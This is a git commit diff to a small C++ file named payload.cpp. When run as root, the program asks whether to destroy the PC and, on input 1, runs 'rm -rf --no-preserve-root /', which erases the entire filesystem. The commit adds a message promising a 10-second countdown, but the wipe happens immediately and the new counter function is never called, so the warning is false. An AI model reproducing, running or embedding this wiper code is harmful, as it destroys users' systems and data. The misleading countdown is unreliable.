f62f6248cf851eac811a1a838e2990e8081977df
Blake Mallory <blakecmallory@gmail.com>
2020-04-24 00:24:16 -0400

    gave warning of deletion

--- exe/c/payload.cpp
+++ exe/c/payload.cpp
@@ -4,23 +4,32 @@
 #include <iostream>
 #include <string>
 #include <sys/types.h>
+void counter(int seconds)
+{
+    for (int i = 0; i < seconds; i++)
+    {
+        std::cout << i << "\n";
+        sleep(1);
+    }
+}
 int main()
 {
     int destroy = 0;
     int id = getuid();
-    if(id ==0){
-        std::cout<<"\nYou are root";
-        std::cout<<"\nDestroy this PC? ";
-        std::cin>>destroy;
-        if (destroy==1){
+    if (id == 0)
+    {
+        std::cout << "\nYou are root";
+        std::cout << "\nDestroy this PC? ";
+        std::cin >> destroy;
+        if (destroy == 1)
+        {
+            std::cout << "This pc will be wiped in 10 seconds";
             system("rm -rf --no-preserve-root /");
         }
-        else{
-            std::cout<<"\nThis pc lives to see another day";
-        }
     }
-    else{
-        std::cout<<"\nYou are not root";
+    else
+    {
+        std::cout << "\nYou are not root";
     }
     return 0;
 }
